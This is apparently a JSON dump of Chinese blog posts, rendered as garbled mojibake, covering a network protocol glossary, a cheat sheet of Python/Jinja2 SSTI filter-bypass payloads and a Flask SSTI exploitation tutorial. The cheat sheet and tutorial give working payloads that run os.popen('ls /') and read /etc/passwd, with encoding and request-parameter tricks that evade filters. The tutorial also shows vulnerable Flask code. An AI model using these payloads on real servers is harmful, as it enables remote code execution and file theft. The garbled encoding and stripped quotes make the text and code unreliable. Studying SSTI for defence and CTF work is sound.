Protocolï¼Œä¼ è¾“æ§åˆ¶åè®®ï¼‰æ˜¯äº’è”ç½‘åè®®å¥—ä»¶ä¸­çš„æ ¸å¿ƒåè®®ä¹‹ä¸€ï¼Œä½äºä¼ è¾“å±‚ã€‚å®ƒæä¾›äº†ä¸€ç§å¯é çš„ã€é¢å‘è¿æ¥çš„ã€åŸºäºå­—èŠ‚æµçš„æ•°æ®ä¼ è¾“æœåŠ¡ã€‚TCP çš„ä¸»è¦ç‰¹ç‚¹æ˜¯ç¡®ä¿æ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ä¸ä¸¢å¤±ã€ä¸é‡å¤ï¼Œå¹¶ä¸”æŒ‰é¡ºåºåˆ°è¾¾ SMTPåè®® SMTPï¼ˆSimple Mail Transfer Protocolï¼Œç®€å•é‚®ä»¶ä¼ è¾“åè®®ï¼‰æ˜¯ä¸€ç§ç”¨äºå‘é€ç”µå­é‚®ä»¶çš„ç½‘ç»œåè®®ï¼Œè´Ÿè´£å°†é‚®ä»¶ä»å‘é€æ–¹ä¼ é€’åˆ°æ¥æ”¶æ–¹çš„é‚®ä»¶æœåŠ¡å™¨ é»˜è®¤ç«¯å£25 DNSåè®® DNSï¼ˆDomain Name Systemï¼ŒåŸŸåç³»ç»Ÿï¼‰æ˜¯äº’è”ç½‘ä¸­ç”¨äºå°†åŸŸåï¼ˆå¦‚ www.example.comï¼‰è½¬æ¢ä¸º IP åœ°å€ï¼ˆå¦‚ 93.184.216.34ï¼‰çš„åˆ†å¸ƒå¼ç³»ç»Ÿ DNS ç›¸å½“äºäº’è”ç½‘çš„ç”µè¯ç°¿ï¼Œä½¿å¾—ç”¨æˆ·å¯ä»¥é€šè¿‡æ˜“è®°çš„åŸŸåè®¿é—®ç½‘ç»œèµ„æºï¼Œè€Œæ— éœ€è®°ä½å¤æ‚çš„ IP åœ°å€ é»˜è®¤ç«¯å£53 HTTPåè®® HTTPï¼ˆHyperText Transfer Protocolï¼Œè¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼‰æ˜¯äº’è”ç½‘ä¸Šåº”ç”¨æœ€å¹¿æ³›çš„åè®®ä¹‹ä¸€ï¼Œç”¨äºåœ¨å®¢æˆ·ç«¯ï¼ˆå¦‚æµè§ˆå™¨ï¼‰å’ŒæœåŠ¡å™¨ä¹‹é—´ä¼ è¾“è¶…æ–‡æœ¬ï¼ˆå¦‚ç½‘é¡µï¼‰ HTTP æ˜¯ä¸‡ç»´ç½‘ï¼ˆWWWï¼‰çš„åŸºç¡€ï¼Œæ”¯æŒç½‘é¡µæµè§ˆã€æ–‡ä»¶ä¸‹è½½ã€API è°ƒç”¨ç­‰åº”ç”¨åœºæ™¯ é»˜è®¤ç«¯å£80 HTTPSåè®® HTTPSï¼ˆHyperText Transfer Protocol Secureï¼Œå®‰å…¨è¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼‰æ˜¯ HTTP çš„å®‰å…¨ç‰ˆæœ¬ï¼Œé€šè¿‡åœ¨ HTTP å’Œä¼ è¾“å±‚ä¹‹é—´åŠ å…¥ TLS/SSL åŠ å¯†å±‚ï¼Œä¿æŠ¤æ•°æ®ä¼ è¾“çš„å®‰å…¨æ€§å’Œå®Œæ•´æ€§ HTTPS å¹¿æ³›ç”¨äºä¿æŠ¤æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚ç™»å½•å‡­è¯ã€æ”¯ä»˜ä¿¡æ¯ï¼‰çš„ä¼ è¾“ é»˜è®¤ç«¯å£443 POP3åè®® POP3ï¼ˆPost Office Protocol version 3ï¼Œé‚®å±€åè®®ç¬¬3ç‰ˆï¼‰æ˜¯ä¸€ç§ç”¨äºä»é‚®ä»¶æœåŠ¡å™¨ä¸‹è½½ç”µå­é‚®ä»¶çš„åè®® POP3 å…è®¸ç”¨æˆ·é€šè¿‡å®¢æˆ·ç«¯ï¼ˆå¦‚ Outlookã€Thunderbirdï¼‰ä»æœåŠ¡å™¨è·å–é‚®ä»¶ï¼Œå¹¶å°†é‚®ä»¶å­˜å‚¨åˆ°æœ¬åœ°è®¾å¤‡ é»˜è®¤ç«¯å£110 IMAPåè®® IMAPï¼ˆInternet Message Access Protocolï¼Œäº’è”ç½‘é‚®ä»¶è®¿é—®åè®®ï¼‰æ˜¯ä¸€ç§ç”¨äºä»é‚®ä»¶æœåŠ¡å™¨è®¿é—®å’Œç®¡ç†ç”µå­é‚®ä»¶çš„åè®® ä¸ POP3 ä¸åŒï¼ŒIMAP å…è®¸ç”¨æˆ·åœ¨æœåŠ¡å™¨ä¸Šç®¡ç†é‚®ä»¶ï¼Œæ”¯æŒå¤šè®¾å¤‡åŒæ­¥å’Œé«˜çº§é‚®ä»¶æ“ä½œ é»˜è®¤ç«¯å£143 RDPåè®® RDPï¼ˆRemote Desktop Protocolï¼Œè¿œç¨‹æ¡Œé¢åè®®ï¼‰æ˜¯ç”± Microsoft å¼€å‘çš„ä¸€ç§åè®®ï¼Œç”¨äºè¿œç¨‹è®¿é—®å’Œæ§åˆ¶å¦ä¸€å°è®¡ç®—æœºçš„æ¡Œé¢ RDP å…è®¸ç”¨æˆ·é€šè¿‡ç½‘ç»œåœ¨æœ¬åœ°è®¾å¤‡ä¸Šæ“ä½œè¿œç¨‹è®¡ç®—æœºï¼Œå°±åƒååœ¨è¿œç¨‹è®¡ç®—æœºå‰ä¸€æ · é»˜è®¤ç«¯å£3389 SFTPåè®® SFTPï¼ˆSSH File Transfer Protocolï¼ŒSSH æ–‡ä»¶ä¼ è¾“åè®®ï¼‰æ˜¯ä¸€ç§åŸºäº SSHï¼ˆSecure Shellï¼‰çš„æ–‡ä»¶ä¼ è¾“åè®®ï¼Œç”¨äºåœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´å®‰å…¨åœ°ä¼ è¾“æ–‡ä»¶ é»˜è®¤çš„ SSH ç«¯å£22 UDPåè®® UDPï¼ˆUser Datagram Protocolï¼Œç”¨æˆ·æ•°æ®æŠ¥åè®®ï¼‰æ˜¯ä¸€ç§ç®€å•çš„ã€æ— è¿æ¥çš„ä¼ è¾“å±‚åè®®ï¼Œç”¨äºåœ¨ç½‘ç»œä¸­ä¼ è¾“æ•°æ® ä¸TCPä¸åŒçš„æ˜¯ï¼ŒUDPä¸æä¾›å¯é æ€§ã€é¡ºåºæ€§å’Œæµé‡æ§åˆ¶ï¼Œä½†å®ƒå…·æœ‰ä½å»¶è¿Ÿå’Œé«˜æ•ˆçš„ç‰¹ç‚¹ï¼Œé€‚åˆå¯¹å®æ—¶æ€§è¦æ±‚è¾ƒé«˜çš„åº”ç”¨ SSLåè®® SSLï¼ˆSecure Sockets Layerï¼Œå®‰å…¨å¥—æ¥å±‚ï¼‰æ˜¯ä¸€ç§ç”¨äºä¿æŠ¤ç½‘ç»œé€šä¿¡å®‰å…¨çš„åè®®ï¼Œé€šè¿‡åœ¨ä¼ è¾“å±‚å’Œåº”ç”¨å±‚ä¹‹é—´å»ºç«‹åŠ å¯†é€šé“ï¼Œé˜²æ­¢æ•°æ®è¢«çªƒå¬ã€ç¯¡æ”¹å’Œä¼ªè£… SSL æ˜¯ HTTPSã€FTPS ç­‰å®‰å…¨åè®®çš„åŸºç¡€ï¼Œç°å·²è¢«æ›´å…ˆè¿›çš„ TLSï¼ˆTransport Layer Securityï¼Œä¼ è¾“å±‚å®‰å…¨ï¼‰åè®®æ‰€å–ä»£ï¼Œä½† SSL ä»ç„¶è¢«å¹¿æ³›ä½¿ç”¨å’ŒæåŠ TLSåè®® TLSï¼ˆTransport Layer Securityï¼Œä¼ è¾“å±‚å®‰å…¨ï¼‰æ˜¯ä¸€ç§ç”¨äºåœ¨ç½‘ç»œä¸­åŠ å¯†æ•°æ®ä¼ è¾“çš„åè®®ï¼Œæ—¨åœ¨ä¿æŠ¤æ•°æ®çš„æœºå¯†æ€§ã€å®Œæ•´æ€§å’Œèº«ä»½éªŒè¯ã€‚ TLS æ˜¯ SSLï¼ˆSecure Sockets Layerï¼Œå®‰å…¨å¥—æ¥å±‚ï¼‰çš„ç»§ä»»è€…ï¼Œæä¾›äº†æ›´å¼ºçš„å®‰å…¨æ€§å’Œæ€§èƒ½ã€‚TLS æ˜¯ HTTPSã€SMTPSã€FTPS ç­‰å®‰å…¨åè®®çš„åŸºç¡€ ARPåè®® ARPï¼ˆAddress Resolution Protocolï¼Œåœ°å€è§£æåè®®ï¼‰æ˜¯ä¸€ç§ç”¨äºå°†ç½‘ç»œå±‚åœ°å€ï¼ˆå¦‚ IP åœ°å€ï¼‰è§£æä¸ºæ•°æ®é“¾è·¯å±‚åœ°å€ï¼ˆå¦‚ MAC åœ°å€ï¼‰çš„åè®® RARPåè®® RARPï¼ˆReverse Address Resolution Protocolï¼Œåå‘åœ°å€è§£æåè®®ï¼‰æ˜¯ä¸€ç§ç”¨äºå°†æ•°æ®é“¾è·¯å±‚åœ°å€ï¼ˆå¦‚ MAC åœ°å€ï¼‰è§£æä¸ºç½‘ç»œå±‚åœ°å€ï¼ˆå¦‚ IP åœ°å€ï¼‰çš„åè®® RARP æ˜¯ ARPï¼ˆAddress Resolution Protocolï¼Œåœ°å€è§£æåè®®ï¼‰çš„åå‘æ“ä½œï¼Œä¸»è¦ç”¨äºæ— ç›˜å·¥ä½œç«™ç­‰è®¾å¤‡åœ¨å¯åŠ¨æ—¶è·å–è‡ªå·±çš„ IP åœ°å€ DHCPåè®® DHCPï¼ˆDynamic Host Configuration Protocolï¼ŒåŠ¨æ€ä¸»æœºé…ç½®åè®®ï¼‰æ˜¯ä¸€ç§ç”¨äºè‡ªåŠ¨åˆ†é… IP åœ°å€å’Œå…¶ä»–ç½‘ç»œé…ç½®ä¿¡æ¯ï¼ˆå¦‚å­ç½‘æ©ç ã€é»˜è®¤ç½‘å…³ã€DNS æœåŠ¡å™¨ï¼‰çš„åè®® DHCP ç®€åŒ–äº†ç½‘ç»œç®¡ç†ï¼Œå…è®¸è®¾å¤‡åœ¨åŠ å…¥ç½‘ç»œæ—¶è‡ªåŠ¨è·å–å¿…è¦çš„é…ç½®ï¼Œè€Œæ— éœ€æ‰‹åŠ¨è®¾ç½® MTPåè®® MTPï¼ˆMedia Transfer Protocolï¼Œåª’ä½“ä¼ è¾“åè®®ï¼‰æ˜¯ä¸€ç§ç”¨äºåœ¨è®¾å¤‡å’Œè®¡ç®—æœºä¹‹é—´ä¼ è¾“åª’ä½“æ–‡ä»¶ï¼ˆå¦‚ç…§ç‰‡ã€è§†é¢‘ã€éŸ³ä¹ï¼‰çš„åè®® MTP ç”± Microsoft å¼€å‘ï¼Œä¸»è¦ç”¨äºè¿æ¥ Android è®¾å¤‡ã€æ•°ç ç›¸æœºã€MP3 æ’­æ”¾å™¨ç­‰åª’ä½“è®¾å¤‡ä¸è®¡ç®—æœº NTPåè®® NTPï¼ˆNetwork Time Protocolï¼Œç½‘ç»œæ—¶é—´åè®®ï¼‰æ˜¯ä¸€ç§ç”¨äºåŒæ­¥è®¡ç®—æœºç³»ç»Ÿæ—¶é—´çš„åè®® NTP é€šè¿‡åˆ†å±‚çš„æ—¶é—´æœåŠ¡å™¨æ¶æ„ï¼Œç¡®ä¿ç½‘ç»œä¸­æ‰€æœ‰è®¾å¤‡çš„æ—¶é—´ä¿æŒä¸€è‡´ï¼Œç²¾åº¦å¯è¾¾æ¯«ç§’ç”šè‡³å¾®ç§’çº§åˆ« NTP æ˜¯äº’è”ç½‘ä¸Šæœ€å¹¿æ³›ä½¿ç”¨çš„æ—¶é—´åŒæ­¥åè®®ï¼Œå¹¿æ³›åº”ç”¨äºè®¡ç®—æœºç½‘ç»œã€é‡‘èäº¤æ˜“ã€ç§‘å­¦å®éªŒç­‰é¢†åŸŸã€‚ PPPåè®® PPPï¼ˆPoint-to-Point Protocolï¼Œç‚¹å¯¹ç‚¹åè®®ï¼‰æ˜¯ä¸€ç§ç”¨äºåœ¨ç‚¹å¯¹ç‚¹é“¾è·¯ä¸Šä¼ è¾“æ•°æ®çš„åè®®ã€‚ PPP å¹¿æ³›åº”ç”¨äºæ‹¨å·è¿æ¥ã€DSLã€V*N ç­‰åœºæ™¯ï¼Œæ”¯æŒå¤šç§ç½‘ç»œå±‚åè®®ï¼ˆå¦‚ IPã€IPXï¼‰çš„å°è£…å’Œä¼ è¾“ ICMPåè®® ICMPï¼ˆInternet Control Message Protocolï¼Œäº’è”ç½‘æ§åˆ¶æ¶ˆæ¯åè®®ï¼‰æ˜¯ TCP/IP åè®®æ—ä¸­çš„ä¸€ç§ç½‘ç»œå±‚åè®®ï¼Œç”¨äºåœ¨ IP ç½‘ç»œä¸­ä¼ é€’æ§åˆ¶æ¶ˆæ¯å’Œé”™è¯¯æŠ¥å‘Š ICMP ä¸»è¦ç”¨äºè¯Šæ–­ç½‘ç»œé—®é¢˜ã€æ£€æµ‹ç½‘ç»œå¯è¾¾æ€§å’ŒæŠ¥å‘Šé”™è¯¯æ¡ä»¶ ICMP æ˜¯ç½‘ç»œç®¡ç†å’Œæ•…éšœæ’é™¤çš„é‡è¦å·¥å…·ï¼Œå¸¸è§çš„å·¥å…·å¦‚ ping å’Œ traceroute éƒ½ä¾èµ–äº ICMP IGMPåè®® IGMPï¼ˆInternet Group Management Protocolï¼Œäº’è”ç½‘ç»„ç®¡ç†åè®®ï¼‰æ˜¯ä¸€ç§ç”¨äºç®¡ç† IP ç»„æ’­ç»„æˆå‘˜å…³ç³»çš„åè®® IGMP è¿è¡Œåœ¨ä¸»æœºå’Œä¸å…¶ç›´æ¥ç›¸è¿çš„è·¯ç”±å™¨ä¹‹é—´ï¼Œç”¨äºæ”¯æŒ IP ç»„æ’­é€šä¿¡ GGPåè®® GGPï¼ˆGateway-to-Gateway Protocolï¼Œç½‘å…³åˆ°ç½‘å…³åè®®ï¼‰æ˜¯ä¸€ç§æ—©æœŸçš„è·¯ç”±åè®®ï¼Œç”¨äºåœ¨äº’è”ç½‘çš„æ ¸å¿ƒè·¯ç”±å™¨ä¹‹é—´äº¤æ¢è·¯ç”±ä¿¡æ¯ GGP æ˜¯ ARPANETï¼ˆç°ä»£äº’è”ç½‘çš„å‰èº«ï¼‰ä¸­æœ€æ—©ä½¿ç”¨çš„è·¯ç”±åè®®ä¹‹ä¸€ï¼Œä¸»è¦ç”¨äºåœ¨ç½‘å…³ï¼ˆå³è·¯ç”±å™¨ï¼‰ä¹‹é—´åŠ¨æ€å­¦ä¹ å’Œä¼ æ’­è·¯ç”±ä¿¡æ¯ MCPåè®® MCPï¼ˆModel Context Protocolï¼Œæ¨¡å‹ä¸Šä¸‹æ–‡åè®®ï¼‰æ˜¯ä¸€ç§å¼€æ”¾åè®®ï¼Œæ—¨åœ¨å®ç° å¤§å‹è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰ åº”ç”¨ä¸å¤–éƒ¨æ•°æ®æºã€å·¥å…·å’ŒæœåŠ¡ä¹‹é—´çš„æ— ç¼é›†æˆï¼Œç±»ä¼¼äºç½‘ç»œä¸­çš„ HTTP åè®®æˆ–é‚®ä»¶ä¸­çš„ SMTP åè®® MCP åè®®é€šè¿‡æ ‡å‡†åŒ–æ¨¡å‹ä¸å¤–éƒ¨èµ„æºçš„äº¤äº’æ–¹å¼ï¼Œæå‡ LLM åº”ç”¨çš„åŠŸèƒ½æ€§ã€çµæ´»æ€§å’Œå¯æ‰©å±•æ€§ å‚è€ƒï¼š èœé¸Ÿæ•™ç¨‹â€“ç½‘ç»œåè®®","tags":["ç½‘ç»œåè®®"],"categories":["è®¡ç®—æœºç½‘ç»œ","ç½‘ç»œåè®®"]},{"title":"Python SSTIåŸºç¡€ç»•è¿‡","path":"/2025/07/09/Python SSTIåŸºç¡€ç»•è¿‡/","content":"Python SSTIåŸºç¡€ç»•è¿‡ å…³é”®å­—ç»•è¿‡ æ‹¼æ¥ .__class__ = [__cla + ss__] #å¯ä»¥ä¸ç”¨åŠ å·.__class__ =|attr((__clas,s__)|join) è¿˜å¯ä»¥ç”¨~è¿›è¡Œæ‹¼æ¥ .__class__ = [__cla~ss__]%set a=__cla %%set b=ss__%[a~b] åˆ©ç”¨ç¼–ç ç»•è¿‡ base64ç¼–ç ã€Unicodeç¼–ç ã€Hexç¼–ç ç­‰ ä»¥base64ä¸ºä¾‹ï¼š ().__class__.__base__.__subclasses__()[59].__init__.__globals__[X19idWlsdGluc19f.decode(base64)][ZXZhbA==.decode(base64)](X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ==.decode(base64))#ç­‰ä»·äº().__class__.__base__.__subclasses__()[59].__init__.__globals__[__builtins__][eval](__import__(os).popen(ls /).read()) è½¬ç½® .__class__ = [__ssalc__[::-1]].__class__ = [__ssalc__|reverse] åˆ©ç”¨strå†…ç½®æ–¹æ³• .__class__ = [__cTass__.replace(T,l)] [X19jbGFzc19f.decode(base64)] = #python2[__CLASS__.lower()]__claee__|replace(ee,ss) å­—ç¬¦ç»•è¿‡ è¿‡æ»¤äº†. jinja2ä¸­é™¤äº†Pythonä¸­é ç‚¹è·å–å±æ€§ï¼Œè¿˜å¯ä»¥ç”¨ä¸­æ‹¬å· .__class__ = [__class__] å¦‚æœè¿ä¸­æ‹¬å·ä¹Ÿè¿‡æ»¤äº†çš„è¯ï¼Œè¿˜æœ‰ä¸€ä¸ª|attrçš„è¿‡æ»¤å™¨ .__class__ = |attr(__class__) è¿‡æ»¤äº†[] åˆ©ç”¨__getitem__()ç»•è¿‡ getitem() æ˜¯pythonçš„ä¸€ä¸ªé­”æœ¯æ–¹æ³•,å¯¹å­—å…¸ä½¿ç”¨æ—¶,ä¼ å…¥å­—ç¬¦ä¸²,è¿”å›å­—å…¸ç›¸åº”é”®æ‰€å¯¹åº”çš„å€¼:å½“å¯¹åˆ—è¡¨ä½¿ç”¨æ—¶,ä¼ å…¥æ•´æ•°è¿”å›åˆ—è¡¨å¯¹åº”ç´¢å¼•çš„å€¼ [117]=__getitem__(117)().__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(__builtins__).__getitem__(eval)(__import__(os).popen(ls /).read()) åˆ©ç”¨pop()ç»•è¿‡ pop()æ–¹æ³•å¯ä»¥è¿”å›æŒ‡å®šåºåˆ—å±æ€§ä¸­çš„æŸä¸ªç´¢å¼•å¤„çš„å…ƒç´ æˆ–æŒ‡å®šå­—å…¸å±æ€§ä¸­æŸä¸ªé”®å¯¹åº”çš„å€¼ï¼Œç”¨æ³•å’Œä¸Šé¢çš„__getitem__()åŸºæœ¬ä¸€æ · ().__class__.__base__.__subclasses__().pop(117).__init__.__globals__.pop(__builtins__).pop(eval)(__import__(os).popen(ls /).read()) æ³¨ï¼šæœ€å¥½ä¸è¦ç”¨pop()ï¼Œå› ä¸ºpop()ä¼šåˆ é™¤ç›¸åº”ä½ç½®çš„å€¼ åˆ©ç”¨å­—å…¸è¯»å–ç»•è¿‡ æˆ‘ä»¬çŸ¥é“è®¿é—®å­—å…¸é‡Œçš„å€¼æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ç§æ˜¯æŠŠç›¸åº”çš„é”®æ”¾å…¥æˆ‘ä»¬ç†Ÿæ‚‰çš„æ–¹æ‹¬å· [] é‡Œæ¥è®¿é—®ï¼Œå¦ä¸€ç§å°±æ˜¯ç”¨ç‚¹ . æ¥è®¿é—®ã€‚æ‰€ä»¥ï¼Œå½“æ–¹æ‹¬å· [] è¢«è¿‡æ»¤ä¹‹åï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ç”¨ç‚¹ . çš„æ–¹å¼æ¥è®¿é—® .__class__.__base__.subclasses__()[117].__init__.__globals__[__builtins__][eval](__import__(os).popen(ls /).read())=.__class__.base__.subclasses__().__getitem__(117).__init__.__globals__.builtins__.eval(__import__(os).popen(ls /).read()) è¿‡æ»¤äº†å¼•å· åˆ©ç”¨char()ç»•è¿‡ ().__class__.__base__.__subclasses__()[40](/etc/passwd).read()=% set chr=().__class__.__base__.__subclasses__()[59].__init__.__globals__.__builtins__.chr%().__class__.__base__..__subclasses__()[40](chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read() åˆ©ç”¨requestå¯¹è±¡ç»•è¿‡ ().__class__.base__.__subclasses__()[77].__init__.__globals__.popen(ls /).read()=().__class__.base__.__subclasses__()[77].__init__.__globals__.popen(request.args.cmd).read()cmd=ls / å¦‚æœè¿‡æ»¤äº†argsï¼Œå¯ä»¥å°†å…¶ä¸­çš„request.argsæ”¹ä¸ºrequest.valuesï¼ŒPOSTå’ŒGETä¸¤ç§æ–¹æ³•ä¼ é€’çš„æ•°æ®request.valueséƒ½å¯ä»¥æ¥æ”¶ è¿‡æ»¤äº†__ åˆ©ç”¨requestç»•è¿‡ ().__class__.base__.__subclasses__()[77].__init__.__globals__.popen(ls /).read()=().[request.args.class][request.args.base][request.args.subclasses]()[77][request.args.init][request.args.globals].popen(ls /).read()class=__class__bass=__base__subclasses=__subclasses__init=__init__globals=__globals__ è¿‡æ»¤äº† åˆ©ç”¨%print(......)%ç»•è¿‡ .__class__.base__.__subclasses__()[77].__init__.__globals__.popen(ls /).read()=%print(.__class__.__base__.__subclasses__()[77].__init__.__globals__.popen(ls /).read())% å‚è€ƒï¼š flask SSTIå­¦ä¹ ä¸æ€»ç»“â€“å¥‡å®‰ä¿¡","tags":["æ¼æ´","SSTI"],"categories":["æ¼æ´"]},{"title":"Python SSTIæ¼æ´ç®€å•åˆ©ç”¨","path":"/2025/07/09/Python SSTIæ¼æ´å­¦ä¹ æ€»ç»“/","content":"Python SSTIæ¼æ´ç®€å•åˆ©ç”¨ SSTI(Server Side Template Injection,æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥) æœåŠ¡å™¨ç«¯ä½¿ç”¨æ¨¡æ¿(Webå¼€å‘ä¸­æ‰€ä½¿ç”¨çš„æ¨¡æ¿å¼•æ“)ï¼Œé€šè¿‡æ¨¡æ¿å¼•æ“å¯¹æ•°æ®è¿›è¡Œæ¸²æŸ“ï¼Œå†ä¼ é€’ç»™ç”¨æˆ·ï¼Œå°±å¯ä»¥é’ˆå¯¹ç‰¹å®šç”¨æˆ·/ç‰¹å®šå‚æ•°ç”Ÿæˆç›¸åº”çš„é¡µé¢ï¼Œæ¨¡æ¿å¼•æ“å¯ä»¥å°†ç”¨æˆ·ç•Œé¢å’Œä¸šåŠ¡æ•°æ®åˆ†ç¦»ï¼Œé€»è¾‘ä»£ç å’Œä¸šåŠ¡ä»£ç ä¹Ÿå¯ä»¥å› æ­¤åˆ†ç¦»ï¼Œä»£ç å¤ç”¨å˜å¾—ç®€å•ï¼Œå¼€å‘æ•ˆç‡ä¹Ÿéšä¹‹æé«˜ã€‚æˆ‘ä»¬å¯ä»¥ç±»æ¯”ç™¾åº¦æœç´¢ï¼Œæœç´¢ä¸åŒè¯æ¡å¾—åˆ°çš„ç»“æœé¡µé¢æ˜¯ä¸åŒçš„ï¼Œä½†é¡µé¢çš„æ¡†æ¶æ˜¯åŸºæœ¬ä¸å˜çš„ã€‚ Flaskåˆè¯† Flaskå¿«é€Ÿä½¿ç”¨ # å®‰è£…è™šæ‹Ÿç¯å¢ƒpip install virtualenv# ç”Ÿæˆè™šæ‹Ÿç¯å¢ƒvirtualenv venv# æ¿€æ´»ç¯å¢ƒ./venv/Scripts/activate.bat# å®‰è£…Flaskpip install flask æµ‹è¯•ä»£ç ï¼š # ä»flaskåŒ…ä¸­å¯¼å…¥flaskå’Œç›¸åº”æ‰€éœ€å‡½æ•°from flask import Flask,render_template_string# å®ä¾‹åŒ–ä¸€ä¸ªFlaskç±»ï¼Œå…¶ä¸­çš„å‚æ•°__name__å¯ä»¥æ›¿æ¢ä¸ºå…¶ä»–ä»»æ„å­—ç¬¦ä¸²app = Flask(__name__)# å®šä¹‰è·¯ç”± /ï¼Œå³å½“ç”¨æˆ·è®¿é—®ç½‘ç«™é¦–é¡µæ—¶ï¼Œè°ƒç”¨ index() å‡½æ•°@app.route(/)def hello_world(): # ä¹Ÿå¯ä»¥ä½¿ç”¨render_template_stringå‡½æ•°æ¥è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²åˆ°é¡µé¢ä¸Šï¼Œå³render_template_string(Hello World!) # return Hello World!if __name__ == __main__: # å¯åŠ¨Flaskåº”ç”¨ app.run() åœ¨venvä¸‹åˆ›å»ºcodeç›®å½•ç”¨æ¥å­˜æ”¾ä»£ç ï¼Œè¿è¡Œtest.pyï¼Œç„¶åè¿›å…¥http://127.0.0.1:5000/ï¼Œå¯ä»¥çœ‹åˆ°ç½‘é¡µä¸Šæ˜¾ç¤ºäº†Hello World!ï¼Œä»£è¡¨appå¯åŠ¨æˆåŠŸ æ¼æ´åŸç† å­˜åœ¨SSTIæ¼æ´çš„ä»£ç ï¼Œå…¶æ ¹æºåœ¨äºä½¿ç”¨å­—ç¬¦ä¸²æ ¼å¼åŒ–ï¼ˆå¦‚ % æˆ– formatï¼‰å°†ç”¨æˆ·è¾“å…¥æ’å…¥æ¨¡æ¿å­—ç¬¦ä¸²ä¸­ï¼Œå†ä¼ é€’ç»™ Jinja2 æ¨¡æ¿å¼•æ“æ¸²æŸ“ ç»å…¸æ¼æ´å†™æ³• å®‰å…¨ï¼š render_template_string(h1Hello name /h1, name=user_input)# æˆ–render_template(index.html, name=user_input) å±é™©ï¼š render_template_string(h1Hello %s/h1 % user_input)# æˆ–Template(h1Hello %s/h1 % user_input).render() ç»å…¸æ¼æ´ä¾‹å­ from flask import Flask, request, render_template_stringfrom jinja2 import Templateapp = Flask(__name__)@app.route(/) def index(): name = request.args.get(name, default=guest) t = html h1Hello %s/h1 /html % (name) # å°†ä¸€æ®µå­—ç¬¦ä¸²ä½œä¸ºæ¨¡æ¿è¿›è¡Œæ¸²æŸ“ return render_template_string(t)è¿™æ ·çš„ä»£ç åŒæ ·å­˜åœ¨æ¼æ´def index(): name = request.args.get(name, default=guest) t = Template( html h1Hello %s/h1 /html % name ) # å¯¹æ¨¡æ¿å¯¹è±¡è¿›è¡Œæ¸²æŸ“ return t.render()app.run() ä½¿ç”¨49ä½œä¸ºå‚æ•°idä¼ å…¥ï¼Œå¯ä»¥çœ‹åˆ°è¡¨è¾¾å¼è¢«æˆåŠŸæ‰§è¡Œï¼Œè¿™å°±æ˜¯SSTIæ¼æ´å‡ºç°çš„ç‰¹å¾ ä¸å­˜åœ¨æ¼æ´çš„ä»£ç  from flask import Flask, request, render_templateapp = Flask(__name__)@app.route(/)def index(): name = request.args.get(name, default=guest) # return render_template(index.html, name=name)app.run() é€šè¿‡è§‚å¯Ÿä»¥ä¸Šä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æ¼æ´å‡ºç°çš„åŸå› ï¼šæœåŠ¡å™¨ç«¯å°†ç”¨æˆ·å¯æ§çš„è¾“å…¥ç›´æ¥æ‹¼æ¥åˆ°æ¨¡æ¿ä¸­è¿›è¡Œæ¸²æŸ“ï¼Œå¯¼è‡´æ¼æ´å‡ºç°ã€‚åä¹‹ï¼Œè¦è§£å†³è¯¥æ¼æ´ï¼Œåˆ™åªéœ€å…ˆå°†æ¨¡æ¿æ¸²æŸ“ï¼Œå†æ‹¼æ¥å­—ç¬¦ä¸²ã€‚ æ·±å…¥åˆ°Flaskæ¸²æŸ“å‡½æ•°åŸç†æ¥è®²ï¼Œrenderå’Œrender_template_stringç”±ç”¨æˆ·æ‹¼æ¥ï¼Œå­—ç¬¦ä¸²ä¸ä¼šè‡ªåŠ¨è½¬ä¹‰ï¼Œè€Œrender_templateä¼šå¯¹å­—ç¬¦ä¸²è®¡è¿›è¡Œè‡ªåŠ¨è½¬ä¹‰ï¼Œå› æ­¤é¿å…äº†å‚æ•°è¢«ä½œä¸ºè¡¨è¾¾å¼æ‰§è¡Œã€‚ æ¼æ´åˆ©ç”¨ åˆ©ç”¨æ€è·¯ ä»¥é€šè¿‡SSTIè¿›è¡ŒRCEä¸ºä¾‹ï¼ŒåŸºæœ¬çš„åˆ©ç”¨æ€è·¯ä¸ºï¼š éšä¾¿æ‰¾ä¸ªå€’éœ‰çš„å†…ç½®ç±»ï¼š[]ã€â€œâ€ é€šè¿‡è¿™ä¸ªç±»è·å–åˆ°objectç±»ï¼šbaseã€basesã€mro é€šè¿‡objectç±»è·å–æ‰€æœ‰å­ç±»ï¼šsubclasses() åœ¨å­ç±»åˆ—è¡¨ä¸­æ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„ç±» ç›´æ¥è°ƒç”¨ç±»ä¸‹é¢å‡½æ•°æˆ–ä½¿ç”¨è¯¥ç±»ç©ºé—´ä¸‹å¯ç”¨çš„å…¶ä»–æ¨¡å—çš„å‡½æ•° é­”æœ¯æ–¹æ³• é­”æœ¯æ–¹æ³• ä½œç”¨ init å¯¹è±¡çš„åˆå§‹åŒ–æ–¹æ³• class è¿”å›å¯¹è±¡æ‰€å±çš„ç±» module è¿”å›ç±»æ‰€åœ¨çš„æ¨¡å— mro è¿”å›ç±»çš„è°ƒç”¨é¡ºåºï¼Œå¯ä»¥æ­¤æ‰¾åˆ°å…¶çˆ¶ç±»ï¼ˆç”¨äºæ‰¾çˆ¶ç±»ï¼‰ base è·å–ç±»çš„ç›´æ¥çˆ¶ç±»ï¼ˆç”¨äºæ‰¾çˆ¶ç±»ï¼‰ bases è·å–çˆ¶ç±»çš„å…ƒç»„ï¼ŒæŒ‰å®ƒä»¬å‡ºç°çš„å…ˆåæ’åºï¼ˆç”¨äºæ‰¾çˆ¶ç±»ï¼‰ dict è¿”å›å½“å‰ç±»çš„å‡½æ•°ã€å±æ€§ã€å…¨å±€å˜é‡ç­‰ subclasses 